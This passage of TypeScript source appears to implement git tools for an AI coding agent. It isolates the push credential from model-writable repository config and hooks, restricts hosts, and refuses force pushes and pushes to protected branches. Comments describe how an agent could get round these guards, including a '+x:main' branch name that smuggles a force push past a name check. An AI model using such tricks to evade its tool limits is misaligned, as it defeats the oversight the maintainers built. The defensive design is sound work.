    // A command that never ran stopped at no stage at all. "stopped at start"
    // would be true only in the sense that nothing happened, and it would point
    // at the room script for something the container did.
    if (result.unreachable) return result;
    const stopped = lastStage(result.stdout);
    if (stopped === "run") return result;
    return {
      ...result,
      stderr:
        `could not prepare an isolated git dir (stopped at ${stopped ?? "start"}): ` +
        `${result.stderr || result.stdout}`
    };
  };

  const closeCleanRoom = (room: string) =>
    shell('rm -rf "$GIT_ROOM"', workdir, { GIT_ROOM: room });

  const cleanRoomPath = () => `/tmp/looping-repo-${crypto.randomUUID()}.git`;

  /**
   * Fetch `origin` without any of the checkout's configuration applying.
   *
   * Three commands, and only the middle one holds the token. The split is not
   * cosmetic: the first has to run `git` **inside the checkout** to read its
   * refs, and a git command in the checkout is precisely what must never carry
   * the credential — that repository's config and hooks are model-writable, and
   * git executes what they name. So the seed goes in its own command with no
   * token, and the credentialed fetch re-asserts the room's own configuration
   * before using it rather than trusting what it finds.
   *
   * 1. build the room and seed it with the checkout's refs, so the fetch has a
   *    negotiation base. Skip it and git has nothing to say it already has, and
   *    re-downloads the entire history on every refresh.
   * 2. re-assert the room's config, then fetch from the forge into it.
   * 3. move the updated remote refs into the checkout, over the local
   *    transport, with no credential anywhere near it.
   */
  const fetchOrigin = async (dir: string, url: string, host: string) => {
    const room = cleanRoomPath();

    const prepared = await shell(
      [
        stage("create"),
        CREATE_ROOM,
        // The alternates have to exist *before* the seed, not only before the
        // fetch. `update-ref` refuses a ref whose object it cannot reach, so
        // without them every ref fails with "nonexistent object", the seed
        // quietly does nothing, and the fetch that follows re-downloads the
        // whole history — the exact cost the seed exists to avoid, and silent
        // because the seed is best-effort.
        stage("assert"),
        ASSERT_ROOM,
        stage("seed"),
        // Best effort: a failure here costs a full history download, not
        // correctness, and a repository with no refs to seed is a fresh one.
        // Wrapped so it cannot fail the chain — `pipefail` would otherwise make
        // an empty ref list stop everything.
        '{ git -C "$REPO_DIR" for-each-ref --format="update %(refname) %(objectname)"' +
          ' | git --git-dir="$GIT_ROOM" update-ref --stdin || true; }'
      ].join(" && "),
      workdir,
      { GIT_ROOM: room, REPO_DIR: dir }
    );
    if (!prepared.success) return roomFailure(prepared);

    try {
      const fetched = await credentialed(
        host,
        `--git-dir="$GIT_ROOM" fetch --prune "$REPO_URL" "+refs/heads/*:refs/remotes/origin/*"`,
        workdir,
        { GIT_ROOM: room, REPO_DIR: dir, REPO_URL: url },
        [stage("assert"), ASSERT_ROOM, stage("run")].join(" && ")
      );
      if (!fetched.success) return roomFailure(fetched);

      return await shell(
        'git -C "$REPO_DIR" fetch --prune "$GIT_ROOM" "+refs/remotes/origin/*:refs/remotes/origin/*"',
        workdir,
        { REPO_DIR: dir, GIT_ROOM: room }
      );
    } finally {
      await closeCleanRoom(room);
    }
  };

  /**
   * Push one branch, by the commit it points at, from a clean dir.
   *
   * The sha is resolved in the checkout beforehand and the ref is written into
   * the clean dir by hand, because the alternative — letting the credentialed
   * git read the checkout to find out what to push — is the thing this whole
   * arrangement exists to avoid.
   */
  const pushBranch = async (
    dir: string,
    url: string,
    host: string,
    branch: string,
    sha: string
  ) => {
    const room = cleanRoomPath();
    try {
      // One command, start to finish, and the push is the only part that needed
      // splitting up before. Nothing here runs git inside the checkout — the
      // room is created in /tmp, its files are written with `printf` and `cp`,
      // and the ref is staged from a sha the caller already resolved. So the
      // token can be present throughout without ever entering a repository
      // whose config and hooks the model can write, and there is no window
      // between building the room and using it for anything to be planted in.
      //
      // No leading `+` on the refspec, so this stays a non-force push — the same
      // guarantee the old `push origin <branch>` gave, now stated outright.
      return roomFailure(
        await credentialed(
          host,
          `--git-dir="$GIT_ROOM" push "$REPO_URL" "refs/heads/$REPO_BRANCH:refs/heads/$REPO_BRANCH"`,
          workdir,
          {
            GIT_ROOM: room,
            REPO_DIR: dir,
            REPO_URL: url,
            REPO_BRANCH: branch,
            REPO_SHA: sha
          },
          [
            stage("create"),
            CREATE_ROOM,
            stage("assert"),
            ASSERT_ROOM,
            stage("stage"),
            'git --git-dir="$GIT_ROOM" update-ref "refs/heads/$REPO_BRANCH" "$REPO_SHA"',
            stage("run")
          ].join(" && ")
        )
      );
    } finally {
      await closeCleanRoom(room);
    }
  };

  /**
   * The origin a checkout was cloned from, re-derived rather than remembered.
   *
   * `repo_push` needs to know which host to offer the credential to, and the
   * only trustworthy answer is the one recorded in the checkout itself — which
   * `repo_clone` only ever writes after the allowlist has passed.
   */
  const origin = async (
    dir: string
  ): Promise<{
    /** Set when the checkout names an origin on an allowed host. */
    remote?: { host: string; url: string };
    /** Set when git never answered, so "no origin" would be a guess. */
    unreachable?: string;
  }> => {
    const result = await plain("remote get-url origin", dir);
    // Two different nothings. `repo_push`'s answer to "no origin here" is to
    // tell the model to clone the repository first — advice that is actively
    // wrong when the truth is that no command ran at all.
    if (result.unreachable) return { unreachable: result.stderr };
    if (!result.success) return {};
    const url = result.stdout.trim();
    const location = repoLocation(url);
    if (!location || !allowedHosts.includes(location.host)) return {};
    // The URL as well as the host: the credentialed commands run in a dir with
    // no remotes, so `origin` means nothing there and the URL has to be passed.
    return { remote: { host: location.host, url } };
  };

  return {
    repo_clone: tool({
      description:
        "Clone a git repository into the workspace. Returns the checkout path and the branch you landed on. If the repository is already checked out from an earlier task, it is fetched and reset to the remote instead — unless it has uncommitted changes, which are left alone for you to inspect.",
      inputSchema: z.object({
        url: z.string().describe("HTTPS repository URL"),
        branch: z
          .string()
          .optional()
          .describe("Branch to check out (default: the repo's default)"),
        depth: z
          .number()
          .optional()
          .describe(
            "Shallow-clone depth. Omit for full history; needed if you must rebase."
          )
      }),
      execute: async ({ url, branch, depth }) => {
        // The gate, before anything runs. `url` is model input, and a clone is
        // the one command that hands a credential to a host it names.
        const location = repoLocation(url);
        if (!location || !allowedHosts.includes(location.host)) {
          return (
            `refusing to clone from "${location?.host ?? url}" — this agent may ` +
            `only clone over https from: ${allowedHosts.join(", ")}`
          );
        }
        const { host } = location;

        // Refused rather than worked around. A URL that passes the host check but
        // names no repository is what a model copies out of a browser —
        // `.../tree/main`, `.../pull/4` — and this used to carry on with a `dir`
        // of `${workdir}/repo` and no `beforeCheckout` at all. A host keying its
        // filesystem per repository therefore never switched, so the clone landed
        // in whichever repository's workspace happened to be active, and the
        // error the model finally saw was git's, about the wrong thing, in the
        // wrong place.
        //
        // Not silently trimmed to the first two segments either, tempting as it
        // is: that also reads `.../orgs/x/repositories` as the repository `x`,
        // and quietly reinterpreting the target is the wrong instinct for the one
        // tool that offers a credential to a host on the model's say-so. A
        // refusal costs one turn and says exactly what to send instead.
        const parsed = parseRepo(url, allowedHosts);
        if (!parsed) {
          return (
            `refusing to clone "${url}" — it does not name a repository. ` +
            `A clone URL is https://<host>/<owner>/<repo>, so if this came out of ` +
            `a browser, drop everything after the repository name (the /tree/…, ` +
            `/pull/… or /blob/… part) and try again.`
          );
        }
        const dir = `${workdir}/${parsed.repo}`;

        // Before anything runs, and before `dir` is touched: a host keying its
        // filesystem per repository needs to have switched by now. See
        // `beforeCheckout` for why this cannot wait for the clone to finish.
        //
        // A throw here stops the clone, which is the exact opposite of how
        // `afterCheckout` is treated — and the asymmetry is the point rather than
        // an inconsistency. This hook *chooses the workspace*; carrying on past a
        // failed one would put the checkout wherever the last task left the
        // selection, which is the failure the hook exists to prevent. By the time
        // `afterCheckout` runs there is a checkout on disk and the model needs to
        // be told about it, so that one is caught and logged.
        try {
          config.beforeCheckout?.({
            url,
            host,
            owner: parsed.owner,
            repo: parsed.repo
          });
        } catch (err) {
          console.error("[repo] beforeCheckout failed", {
            url,
            repo: `${parsed.owner}/${parsed.repo}`,
            err: String(err)
          });
          return (
            `could not select a workspace for ${parsed.owner}/${parsed.repo}: ` +
            `${String(err)}\nNothing was cloned — going ahead would have put the ` +
            `checkout in whichever workspace was already open.`
          );
        }

        // The workspace outlives the task, so this path may already hold the
        // checkout a previous task left — see `refreshCheckout`.
        const existing = await plain("rev-parse --git-dir", dir);
        // A failed probe means "nothing here, clone it" — but only when git
        // answered. A command that never ran means nothing, and the distinction
        // is not academic: a replaced container is precisely the case where this
        // call fails and the *next* one lands on a working replacement. Read as
        // "empty", it points `git clone` at a directory that already holds the
        // checkout — which fails with `destination path already exists` and skips
        // the refresh that was the right answer all along.
        if (existing.unreachable)
          return bounded(`could not clone ${url}: ${existing.stderr}`);
        if (existing.success) {
          const refreshed = await refreshCheckout({
            dir,
            url,
            branch,
            host,
            plain,
            fetchOrigin
          });
          if (refreshed.branch) {
            await notifyCheckout({
              dir,
              url,
              host,
              repo: `${parsed.owner}/${parsed.repo}`,
              branch: refreshed.branch,
              fresh: false
            });
          }
          return refreshed.message;
        }

        // `depth` is a number from the schema, so it cannot carry shell syntax.
        const flags = [
          depth ? `--depth ${Math.max(1, Math.floor(depth))}` : "",
          branch ? `--branch "$REPO_BRANCH"` : ""
        ]
          .filter(Boolean)
          .join(" ");
        // The one credentialed command that needs no clean dir of its own: the
        // target does not exist yet, so there is no config to inherit and git
        // writes the new repository's own. It still carries `cleanConfig`, for
        // the hooks a template directory would otherwise install into it.
        const result = await credentialed(
          host,
          `clone ${flags} "$REPO_URL" "$REPO_DIR"`,
          workdir,
          {
            REPO_URL: url,
            REPO_DIR: dir,
            ...(branch ? { REPO_BRANCH: branch } : {})
          }
        );
        if (!result.success) {
          logFailure("repo_clone", result);
          return bounded(`clone failed: ${result.stderr || result.stdout}`);
        }

        // Identity has to exist before the first commit, and a repo-local config
        // keeps it from leaking into anything else in the container.
        await plain(`config user.name "$GIT_NAME"`, dir, {
          GIT_NAME: author.name
        });
        await plain(`config user.email "$GIT_EMAIL"`, dir, {
          GIT_EMAIL: author.email
        });

        // Falls back to what was asked for rather than reporting an empty name.
        // A failed `rev-parse` used to produce "on branch " and fire
        // `afterCheckout` with no branch at all, which starts an install against
        // a checkout nobody can name.
        const head = await plain("rev-parse --abbrev-ref HEAD", dir);
        const landed = head.stdout.trim() || branch;
        if (!landed) {
          logFailure("repo_clone", head);
          return bounded(
            `cloned to ${dir}, but could not read which branch it landed on: ` +
              `${head.stderr || head.stdout || "git rev-parse failed"}`
          );
        }
        await notifyCheckout({
          dir,
          url,
          host,
          repo: `${parsed.owner}/${parsed.repo}`,
          branch: landed,
          fresh: true
        });
        return `cloned to ${dir} on branch ${landed}`;
      }
    }),

    repo_status: tool({
      description: "Show which files changed in the checkout.",
      inputSchema: z.object({ dir: z.string().describe("Checkout directory") }),
      execute: async ({ dir }) => {
        const result = await plain("status --short", dir);
        // "(no changes)" is a claim about the tree. A command that failed
        // supports no claim about anything, and reporting one as the other sends
        // the model on to commit against a repository it cannot read.
        if (!result.success) {
          logFailure("repo_status", result);
          return bounded(
            `could not read the status of ${dir}: ${result.stderr || result.stdout}`
          );
        }
        return bounded(result.stdout.trim()) || "(no changes)";
      }
    }),

    repo_diff: tool({
      description:
        "Show the current diff. Read this before committing — it is the cheapest way to catch an edit that did more than you intended. Pass stat:true first on a large change to see which files moved and by how much, then read the full diff of what matters.",
      inputSchema: z.object({
        dir: z.string().describe("Checkout directory"),
        staged: z.boolean().optional().describe("Show staged changes instead"),
        stat: z
          .boolean()
          .optional()
          .describe(
            "Summarise as a per-file changed-line count instead of the full patch"
          )
      }),
      execute: async ({ dir, staged, stat }) => {
        const flags = [staged ? "--staged" : "", stat ? "--stat" : ""]
          .filter(Boolean)
          .join(" ");
        const result = await plain(`diff ${flags}`, dir);
        // Same reasoning as `repo_status`: "(no diff)" and "the diff could not
        // be read" are opposite answers, and this is the tool a reviewing agent
        // trusts most.
        if (!result.success) {
          logFailure("repo_diff", result);
          return bounded(
            `could not read the diff in ${dir}: ${result.stderr || result.stdout}`
          );
        }
        // Truncated from the middle rather than the end: the head of a diff and
        // its tail are both informative, and the middle of a large one rarely
        // is. A model that needs the part that was dropped can ask for `stat`
        // and then read the file.
        return bounded(result.stdout.trim()) || "(no diff)";
      }
    }),

    repo_commit: tool({
      description:
        "Stage everything and commit. Write the message for a reviewer reading it in the log a year from now: what changed and why, not how.",
      inputSchema: z.object({
        dir: z.string().describe("Checkout directory"),
        message: z.string().describe("Commit message")
      }),
      execute: async ({ dir, message }) => {
        // Checked rather than fired and forgotten. A failed `add` leaves the
        // index holding less than the model believes, and the commit that
        // follows still succeeds — so the round reports a commit that quietly
        // does not contain the change.
        const staged = await plain("add -A", dir);
        if (!staged.success) {
          logFailure("repo_commit", staged);
          return bounded(
            `could not stage the changes in ${dir}: ${staged.stderr || staged.stdout}`
          );
        }
        // The message is model-authored free text — quotes, backticks, newlines,
        // `$(…)`. Expanded from the environment inside the container, all of
        // that is inert; interpolated into the command string, none of it is.
        const result = await plain(`commit -m "$GIT_COMMIT_MESSAGE"`, dir, {
          GIT_COMMIT_MESSAGE: message
        });
        if (!result.success && /nothing to commit/i.test(result.stdout))
          return "nothing to commit — the working tree is clean";
        if (!result.success) {
          logFailure("repo_commit", result);
          return bounded(`commit failed: ${result.stderr || result.stdout}`);
        }
        return bounded(result.stdout.trim());
      }
    }),

    repo_push: tool({
      description:
        "Push a branch to the remote. Refuses to push to a protected branch and refuses to force-push — open a pull request instead.",
      inputSchema: z.object({
        dir: z.string().describe("Checkout directory"),
        branch: z
          .string()
          .describe(
            "Branch name to create and push, e.g. 'coder/add-json-flag'"
          )
      }),
      execute: async ({ dir, branch }) => {
        // Enforced here rather than in the prompt: a guardrail a model can talk
        // itself out of is not a guardrail.
        //
        // Shape first, then the name. `git push origin <name>` reads `<name>`
        // as a refspec, so `+x:main` is a force push to main that the name
        // check below would wave through — it only ever sees a literal string.
        if (UNSAFE_BRANCH.test(branch))
          return `"${branch}" is not a plain branch name — use something like "coder/add-json-flag"`;
        if (PROTECTED_BRANCHES.has(branch))
          return `refusing to push to "${branch}" — push a work branch and open a pull request`;

        // The repository's *own* default, which is often none of the four names
        // above: a repo whose trunk is `release` deserves the same protection.
        const head = await plain(
          "symbolic-ref --short refs/remotes/origin/HEAD",
          dir
        );
        // A failed read here means "this repository has no `origin/HEAD`, so
        // there is no default branch to protect" — the guards below then stand
        // down. That is a fair reading of an answer and a terrible reading of
        // silence, so a command that never ran stops here instead: the same rule
        // as the two probes further down.
        if (head.unreachable)
          return bounded(`could not push "${branch}": ${head.stderr}`);
        const defaultBranch = head.success
          ? head.stdout.trim().replace(/^origin\//, "")
          : undefined;
        if (defaultBranch && defaultBranch === branch)
          return `refusing to push to "${branch}" — it is this repository's default branch; push a work branch and open a pull request`;

        const { remote, unreachable } = await origin(dir);
        if (unreachable)
          return bounded(`could not push "${branch}": ${unreachable}`);
        if (!remote)
          return `${dir} has no origin on an allowed host — clone it with repo_clone first`;

        // Switch to the branch, or create it — but never *reset* it.
        //
        // This was `checkout -B`, which is create-or-reset, and the difference
        // destroyed real work. The sequence that did it, verbatim from a
        // production run: the model committed on the default branch, ran
        // `git branch coder/x` to save the commit, then `git checkout main &&
        // git reset --hard origin/main` to tidy up. `checkout -B coder/x` then
        // force-moved the branch it had just made back to `origin/main`, so the
        // commit existed only as an unreferenced object. Had the credential been
        // working, this would have pushed an empty branch and opened a pull
        // request on it — a silent, complete loss dressed up as success.
        const exists = await plain(
          `rev-parse --verify --quiet "refs/heads/$REPO_BRANCH"`,
          dir,
          { REPO_BRANCH: branch }
        );
        // Same reasoning as the probe in `repo_clone`: `!success` means "no such
        // branch, create it" only when git was there to say so.
        if (exists.unreachable)
          return bounded(`could not push "${branch}": ${exists.stderr}`);
        const checkout = await plain(
          exists.success
            ? `checkout "$REPO_BRANCH"`
            : `checkout -b "$REPO_BRANCH"`,
          dir,
          { REPO_BRANCH: branch }
        );
        if (!checkout.success) {
          logFailure("repo_push", checkout);
          return bounded(
            `could not switch to branch "${branch}": ${checkout.stderr || checkout.stdout}`
          );
        }

        // Nothing to push is a bug upstream of here, not a no-op.
        //
        // A branch level with the default branch means the commit went
        // somewhere else, or was never made. Pushing it succeeds, `repo_open_pr`
        // opens an empty pull request, and the round reports a URL as if the
        // work had landed — the one outcome worse than an error. Skipped rather
        // than failed when the baseline cannot be resolved: a repository with no
        // `origin/HEAD` is unusual but legitimate, and guessing is worse than
        // not guarding.
        if (defaultBranch) {
          const ahead = await plain(
            `rev-list --count "origin/$REPO_BASE..HEAD"`,
            dir,
            {
              REPO_BASE: defaultBranch
            }
          );
          if (ahead.success && ahead.stdout.trim() === "0") {
            return (
              `refusing to push "${branch}" — it has no commits that origin/${defaultBranch} ` +
              `does not already have, so the pull request would be empty. Check repo_status ` +
              `and repo_diff: either the change was never committed, or it was committed on ` +
              `a different branch.`
            );
          }
        }

        // Resolved here, in the checkout, so the credentialed command downstream
        // never has to read this repository to find out what it is pushing.
        const tip = await plain(
          `rev-parse --verify "refs/heads/$REPO_BRANCH"`,
          dir,
          { REPO_BRANCH: branch }
        );
        if (!tip.success || !tip.stdout.trim()) {
          logFailure("repo_push", tip);
          return bounded(
            `could not resolve "${branch}" to a commit: ${tip.stderr || tip.stdout}`
          );
        }

        const result = await pushBranch(
          dir,
          remote.url,
          remote.host,
          branch,
          tip.stdout.trim()
        );
        if (!result.success) {
          logFailure("repo_push", result);
          return bounded(`push failed: ${result.stderr || result.stdout}`);
        }

        // What `--set-upstream` used to do as a side effect of the push. Written
        // here because the push no longer happens in this repository, and a
        // subagent that reaches for a bare `git push` in the shell should still
        // find the branch tracking something.
        //
        // Checked, but *reported* rather than raised: this is the one place in
        // the plugin where a failed command is genuinely not a failed operation.
        // The push has landed by now — saying so is the important half — and all
        // that is lost is the convenience these two keys buy. Firing them and
        // forgetting was the other extreme, in a file whose whole theme is that
        // an unchecked command is a claim nobody made.
        const remoteSet = await plain(
          `config "branch.$REPO_BRANCH.remote" origin`,
          dir,
          { REPO_BRANCH: branch }
        );
        const mergeSet = await plain(
          `config "branch.$REPO_BRANCH.merge" "refs/heads/$REPO_BRANCH"`,
          dir,
          { REPO_BRANCH: branch }
        );
        const untracked = [remoteSet, mergeSet].find((r) => !r.success);
        if (untracked) {
          // Named apart from the push, which succeeded — a log line reading
          // "repo_push failed" next to a branch that is on the remote is worse
          // than no log line.
          logFailure("repo_push (upstream tracking)", untracked);
          return bounded(
            `pushed ${branch}, but could not record what it tracks: ` +
              `${untracked.stderr || untracked.stdout}\n` +
              `The push itself landed. The only consequence is local: a bare ` +
              `\`git push\` from the shell will not know where to send this ` +
              `branch, and needs \`git push -u origin ${branch}\` once.`
          );
        }
        return `pushed ${branch}`;
      }
    }),

    repo_open_pr: tool({
      description:
        "Open a pull request for a pushed branch and return its URL. Do this once the branch is pushed and the tests pass.",
      inputSchema: z.object({
        url: z.string().describe("The repository URL the branch was pushed to"),
        head: z.string().describe("The branch you pushed"),
        base: z.string().describe("The branch to merge into, e.g. 'main'"),
        title: z.string().describe("Pull request title"),
        body: z
          .string()
          .describe(
            "Pull request description — what changed and why, and how you verified it"
          )
      }),
      execute: async ({ url, head, base, title, body }) => {
        const parsed = parseRepo(url, allowedHosts);
        if (!parsed)
          return `could not parse an owner/repo out of ${url} on an allowed host`;

        // Encoded, not interpolated raw. These come from a model-supplied URL,
        // and an owner containing `?` or `#` would otherwise re-point the
        // request at a different endpoint on the same API.
        const owner = encodeURIComponent(parsed.owner);
        const repo = encodeURIComponent(parsed.repo);

        // Deliberately from the Worker, not the container: this is the only
        // credential that can write to the repository through the API, and it
        // never crosses into the container.
        //
        // Bounded and caught, which the rest of this plugin got for free from
        // `exec` and this call did not. An API that never answers otherwise holds
        // the round open until something further out gives up, and a rejected
        // `fetch` left as a tool error tells the model less than it needs — the
        // one thing it must know is that a POST that timed out may have been
        // received anyway.
        let response: Response;
        try {
          response = await fetch(`${apiBase}/repos/${owner}/${repo}/pulls`, {
            method: "POST",
            headers: {
              authorization: `Bearer ${config.token()}`,
              accept: "application/vnd.github+json",
              "content-type": "application/json",
              "user-agent": "looping-coder"
            },
            body: JSON.stringify({ title, head, base, body }),
            signal: AbortSignal.timeout(PR_TIMEOUT_MS)
          });
        } catch (err) {
          logFailure("repo_open_pr", { stderr: String(err) });
          return (
            `could not reach ${apiBase} to open the pull request: ${String(err)}\n` +
            `The request may have been received anyway — check whether the pull ` +
            `request already exists before retrying, or the retry will open a ` +
            `second one alongside it.`
          );
        }

        if (!response.ok) {
          // `.catch` rather than a bare await: this is the error path already,
          // and a body that will not read must not replace the status that
          // explains the failure.
          const detail = await response.text().catch(() => "");
          logFailure("repo_open_pr", {
            exitCode: response.status,
            stderr: detail
          });
          return `could not open the pull request (${response.status}): ${detail.slice(0, 500)}`;
        }
        const pr = (await response.json().catch(() => ({}))) as {
          html_url?: string;
        };
        return (
          pr.html_url ?? "pull request opened, but the response carried no URL"
        );
      }
    })
  };
}

export function repo(config: RepoConfig): AgentPlugin {
  return definePlugin({
    key: "repo",

    mainAgentTools: () => buildRepoTools(config),

    // The runtime state goes through to `exec` untouched, so a delegated
    // subtask's git commands run in the same container its parent cloned into.
    toolFamilies: {
      [REPO_FAMILY]: (ctx) => ({ tools: buildRepoTools(config, ctx.runtime) })
    },

    capability: [
      "You can work with git repositories:",
      "- `repo_clone` checks one out into the workspace. The checkout may already be there from an earlier task, in which case it is fetched and reset for you — but if it has uncommitted changes it is left as-is, and you should read them with `repo_diff` before deciding what to do.",
      "- `repo_status` and `repo_diff` show what you have changed — read the diff before committing. On a large change call `repo_diff` with `stat: true` first to see which files moved, then read the ones that matter; output is truncated from the middle when it is large.",
      "- `repo_commit` stages everything and commits.",
      "- `repo_push` pushes a work branch. It refuses the default branch and other protected names, and it refuses a branch carrying no commits the default branch does not already have — that is not negotiable.",
      "- `repo_open_pr` opens the pull request and returns its URL.",
      "Never push to the default branch. Finish by opening a pull request and reporting its URL."
    ].join("\n"),

    requires: { secrets: ["GITHUB_TOKEN"] }
  });
}
